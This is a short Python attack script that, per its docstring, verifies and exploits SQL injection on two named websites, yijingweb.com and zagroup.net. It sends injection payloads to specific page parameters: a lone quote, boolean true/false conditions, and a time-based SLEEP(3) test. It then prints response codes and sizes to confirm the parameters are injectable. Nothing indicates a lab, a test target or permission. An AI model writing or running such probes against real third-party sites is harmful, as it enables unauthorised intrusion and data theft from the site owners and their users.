#!/usr/bin/env python3
"""verify + exploit SQLi on yijingweb.com & zagroup.net"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

# 1. verify SQLi - diff between true/false
print("=== yijingweb.com ===")
tests = [
    ("id=686", "base"),
    ("id=686'", "quote"),
    ("id=686' AND '1'='1", "true"),
    ("id=686' AND '1'='2", "false"),
    ("id=686' AND SLEEP(3)--", "sleep"),
]
for suffix, tag in tests:
    code, body = fetch("http://yijingweb.com/webmall/detail.php?%s" % suffix)
    print("  %s [%s]: %s size=%d" % (tag, suffix[:30], code, len(body)))

print("=== zagroup.net ===")
tests = [
    ("c=259", "base"),
    ("c=259'", "quote"),
    ("c=259' AND '1'='1", "true"),
    ("c=259' AND '1'='2", "false"),
    ("c=259' AND SLEEP(3)--", "sleep"),
]
for suffix, tag in tests:
    code, body = fetch("http://zagroup.net/news.php?%s" % suffix)
    print("  %s [%s]: %s size=%d" % (tag, suffix[:30], code, len(body)))
